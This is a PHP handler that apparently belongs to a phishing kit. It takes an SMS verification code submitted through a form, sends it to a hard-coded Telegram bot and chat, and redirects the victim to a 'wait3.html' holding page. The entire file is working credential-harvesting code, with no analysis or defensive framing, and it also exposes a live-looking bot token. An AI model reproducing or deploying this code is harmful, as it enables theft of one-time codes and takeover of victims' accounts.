<?php
// === CONFIG ===
$botToken = '7166403259:AAHcKMLdIWrWZdlf1jp7Vuubd3Tdczov7Eo';
$chatId = '5995238784';

// === GET USER INPUT ===
$smscode = $_POST['smscode'] ?? '';

// === FORMAT MESSAGE ===
$message = "📲 SMS Verification Code Received:\n";
$message .= "Code: $smscode";

// === SEND TO TELEGRAM ===
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
file_get_contents($telegramURL, false, $context);

// === REDIRECT ===
header("Location: wait3.html");
exit;
?>
